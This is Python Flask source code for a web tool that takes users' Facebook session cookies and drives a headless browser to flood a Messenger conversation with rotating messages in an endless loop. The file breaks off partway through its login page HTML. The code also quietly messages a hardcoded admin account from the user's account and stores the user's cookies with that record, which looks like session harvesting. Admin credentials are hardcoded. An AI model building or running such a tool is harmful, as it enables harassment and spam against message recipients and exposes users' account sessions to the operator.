from flask import Flask, render_template_string, request, session, redirect, url_for
import threading
import time
import uuid
import hashlib
import os
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import database as db
import requests

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this in production

# Configuration
ADMIN_PASSWORD = "THE-RISHI💕"
WHATSAPP_NUMBER = "+917654221354"
APPROVAL_FILE = "approved_keys.json"
PENDING_FILE = "pending_approvals.json"
ADMIN_UID = "61573940335470"

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E2EE Automation</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background-image: url('https://images.unsplash.com/photo-1557683316-973673baf926?w=1920&q=80');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 0;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }
        
        .main-content {
            background: rgba(20, 20, 30, 0.85);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 20px;
        }
        
        .main-header {
            text-align: center;
            margin-bottom: 30px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .main-header h1 {
            color: #ffffff;
            font-size: 2.5rem;
            font-weight: 900;
            margin-bottom: 10px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }
        
        .main-header p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 1rem;
            font-weight: 500;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px 24px;
            font-weight: 700;
            font-size: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            width: 100%;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(102, 126, 234, 0.6);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            color: #ffffff;
            font-weight: 700;
            font-size: 13px;
            display: block;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .form-input, .form-textarea, .form-number {
            background: rgba(255, 255, 255, 0.08);
            border: 2px solid rgba(255, 255, 255, 0.15);
            border-radius: 10px;
            color: #ffffff;
            padding: 14px;
            transition: all 0.3s ease;
            width: 100%;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            font-weight: 500;
        }
        
        .form-input::placeholder, .form-textarea::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        
        .form-input:focus, .form-textarea:focus, .form-number:focus {
            background: rgba(255, 255, 255, 0.12);
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
            color: white;
            outline: none;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            background: rgba(255, 255, 255, 0.05);
            padding: 8px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        
        .tab {
            background: transparent;
            border-radius: 8px;
            color: rgba(255, 255, 255, 0.6);
            padding: 12px 20px;
            cursor: pointer;
            flex: 1;
            text-align: center;
            font-weight: 700;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .tab.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
        }
        
        .tab-content {
            display: none;
        }
        
        .metric-value {
            color: #667eea;
            font-weight: 900;
            font-size: 2.2rem;
            text-shadow: 0 2px 10px rgba(102, 126, 234, 0.3);
        }
        
        .metric-label {
            color: rgba(255, 255, 255, 0.8);
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .console-section {
            margin-top: 20px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.4);
            border-radius: 12px;
            border: 1px solid rgba(102, 126, 234, 0.3);
        }
        
        .console-header {
            color: #667eea;
            text-shadow: 0 0 10px rgba(102, 126, 234, 0.5);
            margin-bottom: 15px;
            font-weight: 800;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .console-output {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(102, 126, 234, 0.2);
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #00ff88;
            line-height: 1.8;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .console-line {
            margin-bottom: 5px;
            padding: 8px 12px;
            padding-left: 30px;
            color: #00ff88;
            background: rgba(0, 255, 136, 0.05);
            border-left: 3px solid rgba(0, 255, 136, 0.4);
            position: relative;
            border-radius: 4px;
        }
        
        .console-line::before {
            content: '►';
            position: absolute;
            left: 12px;
            opacity: 0.7;
            color: #00ff88;
        }
        
        .info-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            padding: 25px;
            border-radius: 15px;
            margin: 15px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        
        .alert {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            font-weight: 600;
        }
        
        .alert-success {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid rgba(76, 175, 80, 0.5);
            color: #4caf50;
        }
        
        h2, h3 {
            color: #ffffff;
            font-weight: 800;
            margin-bottom: 15px;
        }
        
        @media (max-width: 768px) {
            .main-header h1 {
                font-size: 1.8rem;
            }
            
            .grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        {{ content | safe }}
    </div>
    
    <script>
        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.getElementById(tabName).style.display = 'block';
            event.target.classList.add('active');
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(function() {
                alert('Copied to clipboard: ' + text);
            }, function(err) {
                console.error('Could not copy text: ', err);
            });
        }
        
        // Show first tab by default
        document.addEventListener('DOMContentLoaded', function() {
            const firstTab = document.querySelector('.tab');
            const firstTabContent = document.querySelector('.tab-content');
            if (firstTab && firstTabContent) {
                firstTab.classList.add('active');
                firstTabContent.style.display = 'block';
            }
        });
    </script>
</body>
</html>
'''

# Utility Functions
def generate_user_key(username, password):
    combined = f"{username}:{password}"
    key_hash = hashlib.sha256(combined.encode()).hexdigest()[:8].upper()
    return f"KEY-{key_hash}"

def load_approved_keys():
    if os.path.exists(APPROVAL_FILE):
        try:
            with open(APPROVAL_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_approved_keys(keys):
    with open(APPROVAL_FILE, 'w') as f:
        json.dump(keys, f, indent=2)

def load_pending_approvals():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_pending_approvals(pending):
    with open(PENDING_FILE, 'w') as f:
        json.dump(pending, f, indent=2)

def send_whatsapp_message(user_name, approval_key):
    message = f"HELLO RISHI SIR PLEASE APPEROVED\nMy name is {user_name}\nPlease approve my key:\nKEY {approval_key}"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
    return whatsapp_url

def check_approval(key):
    approved_keys = load_approved_keys()
    return key in approved_keys

# Automation Classes and Functions
class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'automation_state' in session:
            session['automation_state']['logs'].append(formatted_msg)
            session.modified = True

def find_message_input(driver, process_id, automation_state=None):
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: FOUND message input with text: {element_text[:50]}', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: FOUND Using primary selector editable element (#{idx+1})', automation_state)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: FOUND Using fallback editable element', automation_state)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser...', automation_state)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error

def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
        
        if not messages_list:
            messages_list = ['Hello!']
        
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                    log_message(f'{process_id}: SENT via Enter: "{message_to_send[:30]}..."', automation_state)
                else:
                    log_message(f'{process_id}: SENT via button: "{message_to_send[:30]}..."', automation_state)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                
                log_message(f'{process_id}: Message #{messages_sent} sent. Waiting {delay}s...', automation_state)
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Send error: {str(e)[:100]}', automation_state)
                time.sleep(5)
        
        log_message(f'{process_id}: Automation stopped. Total messages: {messages_sent}', automation_state)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def send_admin_notification(user_config, username, automation_state, user_id):
    driver = None
    try:
        log_message(f"ADMIN-NOTIFY: Preparing admin notification...", automation_state)
        
        admin_e2ee_thread_id = db.get_admin_e2ee_thread_id(user_id)
        
        if admin_e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Using saved admin thread: {admin_e2ee_thread_id}", automation_state)
        
        driver = setup_browser(automation_state)
        
        log_message(f"ADMIN-NOTIFY: Navigating to Facebook...", automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if user_config['cookies'] and user_config['cookies'].strip():
            log_message(f"ADMIN-NOTIFY: Adding cookies...", automation_state)
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        user_chat_id = user_config.get('chat_id', '')
        admin_found = False
        e2ee_thread_id = admin_e2ee_thread_id
        chat_type = 'REGULAR'
        
        if e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Opening saved admin conversation...", automation_state)
            
            if '/e2ee/' in str(e2ee_thread_id) or admin_e2ee_thread_id:
                conversation_url = f'https://www.facebook.com/messages/e2ee/t/{e2ee_thread_id}'
                chat_type = 'E2EE'
            else:
                conversation_url = f'https://www.facebook.com/messages/t/{e2ee_thread_id}'
                chat_type = 'REGULAR'
            
            log_message(f"ADMIN-NOTIFY: Opening {chat_type} conversation: {conversation_url}", automation_state)
            driver.get(conversation_url)
            time.sleep(8)
            admin_found = True
        
        if not admin_found or not e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Searching for admin UID: {ADMIN_UID}...", automation_state)
            
            try:
                profile_url = f'https://www.facebook.com/{ADMIN_UID}'
                log_message(f"ADMIN-NOTIFY: Opening admin profile: {profile_url}", automation_state)
                driver.get(profile_url)
                time.sleep(8)
                
                message_button_selectors = [
                    'div[aria-label*="Message" i]',
                    'a[aria-label*="Message" i]',
                    'div[role="button"]:has-text("Message")',
                    'a[role="button"]:has-text("Message")',
                    '[data-testid*="message"]'
                ]
                
                message_button = None
                for selector in message_button_selectors:
                    try:
                        elements = driver.find_elements(By.CSS_SELECTOR, selector)
                        if elements:
                            for elem in elements:
                                text = elem.text.lower() if elem.text else ""
                                aria_label = elem.get_attribute('aria-label') or ""
                                if 'message' in text or 'message' in aria_label.lower():
                                    message_button = elem
                                    log_message(f"ADMIN-NOTIFY: Found message button: {selector}", automation_state)
                                    break
                            if message_button:
                                break
                    except:
                        continue
                
                if message_button:
                    log_message(f"ADMIN-NOTIFY: Clicking message button...", automation_state)
                    driver.execute_script("arguments[0].click();", message_button)
                    time.sleep(8)
                    
                    current_url = driver.current_url
                    log_message(f"ADMIN-NOTIFY: Redirected to: {current_url}", automation_state)
                    
                    if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                        if '/e2ee/t/' in current_url:
                            e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                            chat_type = 'E2EE'
                            log_message(f"ADMIN-NOTIFY: FOUND E2EE conversation: {e2ee_thread_id}", automation_state)
                        else:
                            e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                            chat_type = 'REGULAR'
                            log_message(f"ADMIN-NOTIFY: FOUND REGULAR conversation: {e2ee_thread_id}", automation_state)
                        
                        if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                            current_cookies = user_config.get('cookies', '')
                            db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                            admin_found = True
                    else:
                        log_message(f"ADMIN-NOTIFY: Message button didn't redirect to messages page", automation_state)
                else:
                    log_message(f"ADMIN-NOTIFY: Could not find message button on profile", automation_state)
            
            except Exception as e:
                log_message(f"ADMIN-NOTIFY: Profile approach failed: {str(e)[:100]}", automation_state)
            
            if not admin_found or not e2ee_thread_id:
                log_message(f"ADMIN-NOTIFY: COULD NOT FIND admin via search, trying DIRECT MESSAGE approach...", automation_state)
                
                try:
                    profile_url = f'https://www.facebook.com/messages/new'
                    log_message(f"ADMIN-NOTIFY: Opening new message page...", automation_state)
                    driver.get(profile_url)
                    time.sleep(8)
                    
                    search_box = None
                    search_selectors = [
                        'input[aria-label*="To:" i]',
                        'input[placeholder*="Type a name" i]',
                        'input[type="text"]'
                    ]
                    
                    for selector in search_selectors:
                        try:
                            search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            if search_elements:
                                for elem in search_elements:
                                    if elem.is_displayed():
                                        search_box = elem
                                        log_message(f"ADMIN-NOTIFY: Found 'To:' box with: {selector}", automation_state)
                                        break
                                if search_box:
                                    break
                        except:
                            continue
                    
                    if search_box:
                        log_message(f"ADMIN-NOTIFY: Typing admin UID in new message...", automation_state)
                        driver.execute_script("""
                            arguments[0].focus();
                            arguments[0].value = arguments[1];
                            arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                        """, search_box, ADMIN_UID)
                        time.sleep(5)
                        
                        result_elements = driver.find_elements(By.CSS_SELECTOR, 'div[role="option"], li[role="option"], a[role="option"]')
                        if result_elements:
                            log_message(f"ADMIN-NOTIFY: Found {len(result_elements)} results, clicking first...", automation_state)
                            driver.execute_script("arguments[0].click();", result_elements[0])
                            time.sleep(8)
                            
                            current_url = driver.current_url
                            if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                                if '/e2ee/t/' in current_url:
                                    e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'E2EE'
                                    log_message(f"ADMIN-NOTIFY: FOUND Direct message opened E2EE: {e2ee_thread_id}", automation_state)
                                else:
                                    e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'REGULAR'
                                    log_message(f"ADMIN-NOTIFY: FOUND Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
                                
                                if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                                    admin_found = True
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Direct message approach failed: {str(e)[:100]}", automation_state)
        
        if not admin_found or not e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
            return
        
        conversation_type = "E2EE" if "e2ee" in driver.current_url else "REGULAR"
        log_message(f"ADMIN-NOTIFY: SUCCESSFULLY opened {conversation_type} conversation with admin", automation_state)
        
        message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)
        
        if message_input:
            from datetime import datetime
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            conversation_type = "E2EE LOCKED" if "e2ee" in driver.current_url.lower() else "Regular CHAT"
            notification_msg = f"NEW User Started Automation\n\nUSERNAME: {username}\nTIME: {current_time}\nCHAT TYPE: {conversation_type}\nTHREAD ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
            
            log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
            driver.execute_script("""
                const element = arguments[0];
                const message = arguments[1];
                
                element.scrollIntoView({behavior: 'smooth', block: 'center'});
                element.focus();
                element.click();
                
                if (element.tagName === 'DIV') {
                    element.textContent = message;
                    element.innerHTML = message;
                } else {
                    element.value = message;
                }
                
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
            """, message_input, notification_msg)
            
            time.sleep(1)
            
            log_message(f"ADMIN-NOTIFY: Trying to send message...", automation_state)
            send_result = driver.execute_script("""
                const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                
                for (let btn of sendButtons) {
                    if (btn.offsetParent !== null) {
                        btn.click();
                        return 'button_clicked';
                    }
                }
                return 'button_not_found';
            """)
            
            if send_result == 'button_not_found':
                log_message(f"ADMIN-NOTIFY: Send button not found, using Enter key...", automation_state)
                driver.execute_script("""
                    const element = arguments[0];
                    element.focus();
                    
                    const events = [
                        new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                    ];
                    
                    events.forEach(event => element.dispatchEvent(event));
                """, message_input)
                log_message(f"ADMIN-NOTIFY: SENT via Enter key", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: SENT Send button clicked", automation_state)
            
            time.sleep(2)
        else:
            log_message(f"ADMIN-NOTIFY: FAILED to find message input", automation_state)
            
    except Exception as e:
        log_message(f"ADMIN-NOTIFY: ERROR sending notification: {str(e)}", automation_state)
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f"ADMIN-NOTIFY: Browser closed", automation_state)
            except:
                pass

def run_automation_with_notification(user_config, username, automation_state, user_id):
    send_admin_notification(user_config, username, automation_state, user_id)
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    if 'automation_state' not in session:
        session['automation_state'] = {
            'running': False,
            'message_count': 0,
            'logs': [],
            'message_rotation_index': 0
        }
    
    if session['automation_state']['running']:
        return
    
    session['automation_state']['running'] = True
    session['automation_state']['message_count'] = 0
    session['automation_state']['logs'] = []
    session.modified = True
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    
    # Create AutomationState object for thread
    automation_state_obj = AutomationState()
    automation_state_obj.running = True
    automation_state_obj.message_count = 0
    automation_state_obj.logs = []
    
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state_obj, user_id))
    thread.daemon = True
    thread.start()
    
    # Store reference in session
    session['automation_thread_state'] = {
        'running': True,
        'message_count': 0,
        'logs': []
    }

def stop_automation(user_id):
    if 'automation_state' in session:
        session['automation_state']['running'] = False
        session.modified = True
    db.set_automation_running(user_id, False)

# Flask Routes
@app.route('/', methods=['GET', 'POST'])
def index():
    if 'logged_in' not in session:
        session['logged_in'] = False
    if 'user_id' not in session:
        session['user_id'] = None
    if 'username' not in session:
        session['username'] = None
    if 'automation_state' not in session:
        session['automation_state'] = {
            'running': False,
            'message_count': 0,
            'logs': [],
            'message_rotation_index': 0
        }
    
    if not session['logged_in']:
        return login_page()
    else:
        return main_app()


def login_page():
    if request.method == 'POST':
        if 'login' in request.form:
            username = request.form.get('username')
            password = request.form.get('password')
            
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    session['logged_in'] = True
                    session['user_id'] = user_id
                    session['username'] = username
                    
                    return redirect(url_for('index'))
        
        elif 'signup' in request.form:
            new_username = request.form.get('new_username')
            new_password = request.form.get('new_password')
            confirm_password = request.form.get('confirm_password')
            
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    success, message = db.create_user(new_username, new_password)
                    if success:
                        return redirect(url_for('index'))
    
    content = '''
    <div class="main-header">
        <img src="https://ibb.co/Psg1Q121.jpg" class="Rishi-logo">
        <h1>THE RISHI OFFLINE E2EE</h1>
        <p>seven billion smiles in his world but yours is my favourite</p>
    </div>
    
    <div class="tabs">
        <div class="tab active" onclick="showTab('login-tab')">LOGIN</div>
        <div class="tab" onclick="showTab('signup-tab')">SIGN UP</div>
    </div>
    
    <div id="login-tab" class="tab-content">
        <form method="POST">
            <div class="form-group">
                <label class="form-label">Username</label>
                <input type="text" name="username" class="form-input" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label class="form-label">Password</label>
                <input type="password" name="password" class="form-input" placeholder="Enter your password" required>
            </div>
            <button type="submit" name="login" class="btn">Login</button>
        </form>
    </div>
    
    <div id="signup-tab" class="tab-content" style="display: none;">
        <form method="POST">
            <div class="form-group">
                <label class="form-label">Choose Username</label>
